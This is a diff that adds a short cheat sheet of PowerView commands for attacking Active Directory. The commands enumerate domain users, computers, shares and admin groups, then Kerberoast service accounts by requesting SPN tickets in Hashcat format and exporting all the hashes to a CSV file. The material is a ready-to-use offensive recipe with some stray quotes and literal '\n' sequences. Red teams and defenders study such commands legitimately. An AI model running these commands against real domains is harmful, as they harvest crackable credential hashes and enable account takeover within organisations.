@@ -1,0 +1,3 @@
+Common commands:Get-NetUser \n Get-NetComputer \n Get-DomainShare (-CheckShareAccess) \n Get-NetUser -SPN | select serviceprincipalname \n Get-NetGroup -AdminCount | select name,memberof,admincount,member | fl
+Get SPN tickets:Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local' # Get Kerberoast hash of user
+Get all SPN tickets:Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv \kerberoast.csv -NoTypeInformation' # Powerview: Get all Kerberoast hashes
